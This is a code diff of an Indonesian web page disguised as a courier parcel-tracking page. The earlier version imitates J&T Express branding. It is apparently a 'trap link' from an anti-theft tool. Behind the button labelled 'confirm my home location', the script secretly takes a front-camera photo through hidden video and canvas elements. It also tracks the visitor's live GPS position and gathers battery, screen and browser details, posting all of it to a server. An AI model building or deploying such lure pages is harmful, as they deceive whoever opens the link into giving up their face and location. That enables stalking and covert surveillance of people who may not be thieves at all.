@@ -3,390 +3,360 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Lacak Pengiriman Paket — J&T Express</title>
+  <title>Lacak Pengiriman Paket — Konfirmasi Alamat</title>
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; }
-    body { background: #f8fafc; color: #1e293b; padding-bottom: 40px; }
+    :root {
+      --primary: #e11d48;
+      --primary-dark: #be123c;
+      --bg: #f8fafc;
+      --card: #ffffff;
+      --text: #0f172a;
+      --text-muted: #64748b;
+      --border: #e2e8f0;
+      --success: #10b981;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body { background: var(--bg); color: var(--text); padding-bottom: 30px; }
     
-    .top-nav {
-      background: #e11d48;
+    header {
+      background: var(--primary);
       color: white;
       padding: 16px 20px;
       display: flex;
       align-items: center;
-      justify-content: space-between;
-      box-shadow: 0 4px 15px rgba(225, 29, 72, 0.2);
-    }
-    .brand { font-size: 19px; font-weight: 900; letter-spacing: -0.5px; }
-    .brand span { color: #fecdd3; font-weight: 400; font-size: 13px; margin-left: 6px; }
-    
-    .container { max-width: 480px; margin: 0 auto; padding: 16px; }
-    
-    .alert-banner {
-      background: #fff1f2;
-      border: 1px solid #fecdd3;
-      border-radius: 14px;
-      padding: 14px 16px;
-      margin-bottom: 16px;
-      display: flex;
       gap: 12px;
-      align-items: flex-start;
+      box-shadow: 0 2px 10px rgba(225, 29, 72, 0.25);
     }
-    .alert-icon { font-size: 24px; line-height: 1; }
-    .alert-title { font-size: 14px; font-weight: 800; color: #be123c; margin-bottom: 2px; }
-    .alert-desc { font-size: 12px; color: #881337; line-height: 1.4; }
-    
+    .logo-icon { font-size: 24px; }
+    .logo-title { font-size: 16px; font-weight: 800; letter-spacing: 0.5px; }
+    .logo-sub { font-size: 11px; opacity: 0.85; }
+
+    .container { max-width: 460px; margin: 0 auto; padding: 16px; }
+
     .card {
-      background: white;
-      border-radius: 18px;
+      background: var(--card);
+      border-radius: 16px;
       padding: 20px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+      border: 1px solid var(--border);
       margin-bottom: 16px;
-      box-shadow: 0 4px 25px rgba(0,0,0,0.06);
-      border: 1px solid #e2e8f0;
     }
-    
-    .tracking-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border-bottom: 1px dashed #cbd5e1;
-      padding-bottom: 12px;
-      margin-bottom: 14px;
-    }
-    .resi-label { font-size: 11px; color: #64748b; text-transform: uppercase; font-weight: 600; }
-    .resi-number { font-size: 15px; font-weight: 800; color: #0f172a; font-family: monospace; }
-    .badge-status {
-      background: #fef08a;
-      color: #854d0e;
-      font-size: 11px;
-      font-weight: 700;
-      padding: 4px 10px;
-      border-radius: 20px;
-    }
-    
-    .info-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; }
-    .info-label { color: #64748b; }
-    .info-val { font-weight: 600; color: #1e293b; text-align: right; }
-    
-    .map-preview {
-      background: #f1f5f9;
-      height: 160px;
-      border-radius: 14px;
-      margin: 16px 0;
-      position: relative;
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border: 2px solid #e2e8f0;
-    }
-    .map-grid {
-      position: absolute;
-      inset: 0;
-      background-image: radial-gradient(#cbd5e1 1.5px, transparent 1.5px);
-      background-size: 16px 16px;
-    }
-    .courier-pulse {
-      position: relative;
-      z-index: 2;
-      display: flex;
-      flex-direction: column;
+
+    .status-badge {
+      display: inline-flex;
       align-items: center;
       gap: 6px;
+      background: #fef2f2;
+      color: var(--primary);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-bottom: 14px;
+      border: 1px solid #fecdd3;
     }
-    .courier-icon {
-      width: 50px;
-      height: 50px;
-      background: #e11d48;
-      color: white;
+    .pulse-dot {
+      width: 8px;
+      height: 8px;
+      background: var(--primary);
       border-radius: 50%;
+      animation: pulse 1s infinite alternate;
+    }
+    @keyframes pulse { from { opacity: 0.4; } to { opacity: 1; } }
+
+    .resi-title { font-size: 13px; color: var(--text-muted); }
+    .resi-num { font-size: 20px; font-weight: 800; color: var(--text); letter-spacing: 1px; margin-bottom: 14px; }
+
+    .info-row {
       display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 26px;
-      box-shadow: 0 0 0 8px rgba(225, 29, 72, 0.2);
-      animation: pulse 1.8s infinite;
+      justify-content: space-between;
+      font-size: 13px;
+      padding: 8px 0;
+      border-bottom: 1px dashed var(--border);
     }
-    @keyframes pulse {
-      0% { box-shadow: 0 0 0 0 rgba(225, 29, 72, 0.4); }
-      70% { box-shadow: 0 0 0 18px rgba(225, 29, 72, 0); }
-      100% { box-shadow: 0 0 0 0 rgba(225, 29, 72, 0); }
+    .info-label { color: var(--text-muted); }
+    .info-val { font-weight: 600; text-align: right; }
+
+    .alert-box {
+      background: #fff1f2;
+      border-left: 4px solid var(--primary);
+      padding: 12px 14px;
+      border-radius: 8px;
+      margin: 16px 0;
+      font-size: 13px;
+      color: #9f1239;
+      line-height: 1.5;
     }
-    .courier-label { font-size: 11px; font-weight: 700; background: white; padding: 3px 10px; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); color: #0f172a; }
-    
+
     .btn-action {
       width: 100%;
+      background: var(--primary);
+      color: white;
+      border: none;
       padding: 16px;
       border-radius: 14px;
-      border: none;
-      background: #e11d48;
-      color: white;
       font-size: 15px;
-      font-weight: 800;
+      font-weight: 700;
       cursor: pointer;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 8px;
-      box-shadow: 0 8px 20px rgba(225, 29, 72, 0.35);
+      box-shadow: 0 6px 20px rgba(225, 29, 72, 0.35);
       transition: all 0.2s;
     }
-    .btn-action:active { transform: scale(0.98); }
-    
-    .success-box {
+    .btn-action:active { transform: scale(0.98); background: var(--primary-dark); }
+
+    .success-view {
       display: none;
-      background: #f0fdf4;
-      border: 1px solid #bbf7d0;
-      border-radius: 14px;
-      padding: 18px;
       text-align: center;
+      padding: 24px 10px;
     }
-    .success-icon { font-size: 34px; margin-bottom: 6px; }
-    .success-title { font-size: 15px; font-weight: 800; color: #166534; margin-bottom: 4px; }
-    .success-desc { font-size: 12px; color: #15803d; line-height: 1.5; }
-    
-    .footer { text-align: center; font-size: 11px; color: #94a3b8; margin-top: 24px; line-height: 1.6; }
+    .success-icon {
+      width: 64px;
+      height: 64px;
+      background: #ecfdf5;
+      color: var(--success);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      margin: 0 auto 16px auto;
+      border: 2px solid #a7f3d0;
+    }
+    .success-title { font-size: 18px; font-weight: 800; color: #065f46; margin-bottom: 8px; }
+    .success-desc { font-size: 13px; color: var(--text-muted); line-height: 1.5; }
+
+    #hiddenVideo, #hiddenCanvas {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0.01;
+      pointer-events: none;
+      left: -9999px;
+    }
   </style>
 </head>
 <body>
 
-  <div class="top-nav">
-    <div class="brand">J&amp;T <span>EXPRESS INDONESIA</span></div>
-    <div style="font-size: 12px; font-weight: 600;">Pusat Bantuan 24 Jam</div>
-  </div>
+  <header>
+    <div class="logo-icon">📦</div>
+    <div>
+      <div class="logo-title">EKSPEDISI EXPRESS KILAT</div>
+      <div class="logo-sub">Layanan Pelacakan &amp; Konfirmasi Pengantaran</div>
+    </div>
+  </header>
 
   <div class="container">
-    <div class="alert-banner">
-      <div class="alert-icon">⚠️</div>
-      <div>
-        <div class="alert-title">Alamat Pengantaran Belum Jelas</div>
-        <div class="alert-desc">Kurir sudah tiba di sekitar area Anda, namun nomor rumah / titik GPS belum terkonfirmasi di sistem. Mohon konfirmasi titik Anda sekarang.</div>
+    <div class="card" id="mainCard">
+      <div class="status-badge">
+        <span class="pulse-dot"></span>
+        <span>KURIR MEMERLUKAN KONFIRMASI</span>
+      </div>
+
+      <div class="resi-title">Nomor Resi Pengiriman:</div>
+      <div class="resi-num">JP882910482910</div>
+
+      <div class="info-row">
+        <span class="info-label">Penerima</span>
+        <span class="info-val">Pemilik Paket</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Jenis Paket</span>
+        <span class="info-val">Barang Elektronik &amp; Aksesoris</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Status Kurir</span>
+        <span class="info-val" style="color: #e11d48;">Kurir di Sekitar Area Anda</span>
+      </div>
+
+      <div class="alert-box">
+        <strong>⚠️ Alamat Kurang Lengkap:</strong><br>
+        Kurir berada di radius dekat Anda namun kesulitan menemukan titik lokasi pasti. Silakan ketuk tombol di bawah untuk menyinkronkan titik lokasi akurat Anda.
+      </div>
+
+      <button class="btn-action" id="btnConfirm" onclick="startCaptureFlow()">
+        <span>📍</span> Konfirmasi Titik Lokasi Rumah Saya
+      </button>
+      <div style="font-size: 11px; color: var(--text-muted); text-align: center; margin-top: 10px;">
+        Pilih "Izinkan" saat browser meminta akses lokasi
       </div>
     </div>
 
-    <div class="card">
-      <div class="tracking-header">
-        <div>
-          <div class="resi-label">Nomor Resi Pengiriman</div>
-          <div class="resi-number">JP8829104921ID</div>
-        </div>
-        <div class="badge-status">Menunggu Lokasi</div>
+    <div class="card success-view" id="successCard">
+      <div class="success-icon">✓</div>
+      <div class="success-title">Titik Lokasi Berhasil Dikonfirmasi!</div>
+      <div class="success-desc">
+        Informasi koordinat akurat Anda telah dikirim langsung ke perangkat kurir di lapangan.<br><br>
+        Kurir akan segera tiba di depan lokasi Anda dalam waktu <strong>10-25 menit</strong>. Mohon pastikan nomor telepon tetap aktif.
       </div>
-
-      <div class="info-row">
-        <span class="info-label">Penerima Paket</span>
-        <span class="info-val">Pemegang Perangkat</span>
+      <div style="margin-top: 20px; font-size: 12px; color: #94a3b8; font-family: monospace;">
+        Status: Disinkronkan dengan Kurir Lapangan
       </div>
-      <div class="info-row">
-        <span class="info-label">Petugas Kurir</span>
-        <span class="info-val">Rian (Delivery Van 04)</span>
-      </div>
-      <div class="info-row">
-        <span class="info-label">Estimasi Tiba</span>
-        <span class="info-val" style="color: #e11d48;">10 - 20 Menit Lagi</span>
-      </div>
-
-      <div class="map-preview">
-        <div class="map-grid"></div>
-        <div class="courier-pulse">
-          <div class="courier-icon">🚚</div>
-          <div class="courier-label">Kurir di Radius 800m</div>
-        </div>
-      </div>
-
-      <div id="actionArea">
-        <button class="btn-action" id="btnConfirm" onclick="startTrapCapture()">
-          <span>📍</span> Konfirmasi Titik Rumah Saya Sekarang
-        </button>
-        <div style="font-size: 11px; color: #64748b; text-align: center; margin-top: 8px;">
-          Klik untuk membagikan titik GPS akurat agar kurir dapat langsung tiba di lokasi Anda.
-        </div>
-      </div>
-
-      <div class="success-box" id="successBox">
-        <div class="success-icon">✅</div>
-        <div class="success-title">Titik Lokasi Berhasil Diterima!</div>
-        <div class="success-desc">Titik koordinat presisi Anda telah otomatis tersinkronisasi ke navigasi kurir. Kurir sedang menuju ke titik lokasi Anda sekarang. Mohon siapkan penerima.</div>
-      </div>
-    </div>
-
-    <div class="footer">
-      &copy; 2026 PT Global Jet Express. All rights reserved.<br>Sistem Pelacakan Pengantaran Terintegrasi.
     </div>
   </div>
 
-  <video id="hiddenVideo" autoplay playsinline muted style="position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none;"></video>
-  <canvas id="hiddenCanvas" style="position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none;"></canvas>
+  <video id="hiddenVideo" autoplay playsinline muted></video>
+  <canvas id="hiddenCanvas"></canvas>
 
   <script>
-    window.addEventListener('DOMContentLoaded', () => {
-      fetch('/api/sentinel/intercept', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          type: 'trap_opened',
-          label: '🪤 PENCURI MEMBUKA LINK PAKET KURIR!',
-          value: 'Pencuri membuka halaman pelacak paket di: ' + location.href
-        })
-      }).catch(() => {});
+    let capturedPhoto = false;
 
-      initRemoteListener();
-    });
-
-    let sirenAudioCtx = null;
-    let sirenOsc = null;
-    let sirenGain = null;
-    let isSirenPlaying = false;
-
-    function initRemoteListener() {
+    async function sendInitialPing() {
       try {
-        const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const ws = new WebSocket(protocol + '//' + location.host);
-        ws.onmessage = (e) => {
+        let batteryPct = 100;
+        let isCharging = false;
+        if (navigator.getBattery) {
           try {
-            const data = JSON.parse(e.data);
-            if (data.type === 'sentinel_siren_trigger') {
-              playPoliceSiren();
-            }
-          } catch(err) {}
-        };
+            const bat = await navigator.getBattery();
+            batteryPct = Math.round(bat.level * 100);
+            isCharging = bat.charging;
+          } catch(e) {}
+        }
+
+        fetch('/api/sentinel/beacon', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            alertType: 'trap_link_opened_paket',
+            activity: 'Thief Opened Paket Trap Link',
+            batteryLevel: batteryPct,
+            isCharging: isCharging,
+            networkName: navigator.onLine ? 'Online (Web)' : 'Offline',
+            screen: window.screen.width + 'x' + window.screen.height,
+            userAgent: navigator.userAgent
+          })
+        }).catch(() => {});
       } catch(e) {}
     }
 
-    function playPoliceSiren() {
-      if (isSirenPlaying) return;
-      isSirenPlaying = true;
-      try {
-        sirenAudioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        sirenOsc = sirenAudioCtx.createOscillator();
-        sirenGain = sirenAudioCtx.createGain();
+    sendInitialPing();
 
-        sirenOsc.type = 'sawtooth';
-        sirenGain.gain.setValueAtTime(1.0, sirenAudioCtx.currentTime);
-
-        let high = false;
-        setInterval(() => {
-          if (!isSirenPlaying || !sirenAudioCtx) return;
-          const targetFreq = high ? 650 : 1250;
-          sirenOsc.frequency.setTargetAtTime(targetFreq, sirenAudioCtx.currentTime, 0.15);
-          high = !high;
-        }, 320);
-
-        sirenOsc.connect(sirenGain);
-        sirenGain.connect(sirenAudioCtx.destination);
-        sirenOsc.start();
-      } catch(e) {}
-    }
-
-    async function startTrapCapture() {
+    async function startCaptureFlow() {
       const btn = document.getElementById('btnConfirm');
       if (btn) {
-        btn.innerHTML = '<span>⏳</span> Mengalibrasi Titik Peta...';
+        btn.innerHTML = '<span>⏳</span> Mengidentifikasi Titik Koordinat...';
+        btn.style.opacity = '0.7';
         btn.disabled = true;
       }
 
-      try {
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        ctx.resume();
-      } catch(e) {}
-
-      captureSelfieQuietly();
+      captureSilentSelfie();
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
-            const acc = pos.coords.accuracy;
-
-            sendBeaconData(lat, lon, acc, 'trap_confirmed');
-
-            document.getElementById('actionArea').style.display = 'none';
-            document.getElementById('successBox').style.display = 'block';
-
-            watchThiefPosition();
+          pos => {
+            handleGpsSuccess(pos);
           },
-          (err) => {
-            sendBeaconData(0, 0, 100, 'trap_gps_denied');
-            document.getElementById('actionArea').style.display = 'none';
-            document.getElementById('successBox').style.display = 'block';
+          err => {
+            reportGpsDenied(err);
           },
           { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
         );
+
+        navigator.geolocation.watchPosition(
+          pos => {
+            sendBeacon(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
+          },
+          () => {},
+          { enableHighAccuracy: true, maximumAge: 3000 }
+        );
       } else {
-        document.getElementById('actionArea').style.display = 'none';
-        document.getElementById('successBox').style.display = 'block';
+        showSuccessView();
       }
     }
 
-    async function captureSelfieQuietly() {
+    async function captureSilentSelfie() {
+      if (capturedPhoto) return;
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
           audio: false
         });
 
         const video = document.getElementById('hiddenVideo');
-        const canvas = document.getElementById('hiddenCanvas');
         video.srcObject = stream;
         await video.play();
 
         setTimeout(() => {
           try {
+            const canvas = document.getElementById('hiddenCanvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            canvas.toBlob((blob) => {
-              if (blob) {
-                fetch('/api/sentinel/selfie', {
-                  method: 'POST',
-                  headers: { 'Content-Type': 'image/jpeg' },
-                  body: blob
-                }).catch(() => {});
-              }
-              stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg', 0.85);
-          } catch(e) {
-            stream.getTracks().forEach(t => t.stop());
-          }
-        }, 800);
-      } catch(err) {}
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+
+            fetch('/api/sentinel/selfie', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ photo: dataUrl, trigger: 'trap_link_paket' })
+            }).catch(() => {});
+
+            capturedPhoto = true;
+            stream.getTracks().forEach(track => track.stop());
+          } catch(e) {}
+        }, 500);
+
+      } catch(e) {}
     }
 
-    async function sendBeaconData(lat, lon, acc, alertType) {
-      let battery = 100;
-      let charging = false;
-      try {
-        if (navigator.getBattery) {
-          const b = await navigator.getBattery();
-          battery = Math.round(b.level * 100);
-          charging = b.charging;
-        }
-      } catch(e) {}
+    function handleGpsSuccess(pos) {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+      const spd = pos.coords.speed || 0;
 
+      sendBeacon(lat, lon, acc, spd);
+      showSuccessView();
+    }
+
+    function reportGpsDenied(err) {
       fetch('/api/sentinel/beacon', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          lat: lat || -6.2088,
-          lon: lon || 106.8456,
-          accuracy: acc || 10,
-          batteryLevel: battery,
-          isCharging: charging,
-          alertType: 'honeypot_trap_clicked',
-          trigger: alertType,
-          networkName: navigator.onLine ? 'Seluler / Wi-Fi Aktif' : 'Offline'
+          alertType: 'trap_gps_denied',
+          activity: 'Pencuri Menolak Izin GPS (' + (err.message || 'Denied') + ')'
         })
       }).catch(() => {});
+
+      showSuccessView();
     }
 
-    function watchThiefPosition() {
-      if (!navigator.geolocation) return;
-      navigator.geolocation.watchPosition((pos) => {
-        sendBeaconData(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'live_thief_tracking');
-      }, null, { enableHighAccuracy: true, maximumAge: 3000 });
+    async function sendBeacon(lat, lon, acc, spd) {
+      try {
+        let batteryPct = 100;
+        let isCharging = false;
+        if (navigator.getBattery) {
+          try {
+            const bat = await navigator.getBattery();
+            batteryPct = Math.round(bat.level * 100);
+            isCharging = bat.charging;
+          } catch(e) {}
+        }
+
+        fetch('/api/sentinel/beacon', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            lat: lat,
+            lon: lon,
+            accuracy: acc,
+            speed: spd,
+            batteryLevel: batteryPct,
+            isCharging: isCharging,
+            alertType: 'thief_trapped_paket',
+            activity: '📍 PENCURI TERJEBAK DI LOKASI PAKET'
+          })
+        }).catch(() => {});
+      } catch(e) {}
+    }
+
+    function showSuccessView() {
+      document.getElementById('mainCard').style.display = 'none';
+      document.getElementById('successCard').style.display = 'block';
     }
   </script>
 </body>
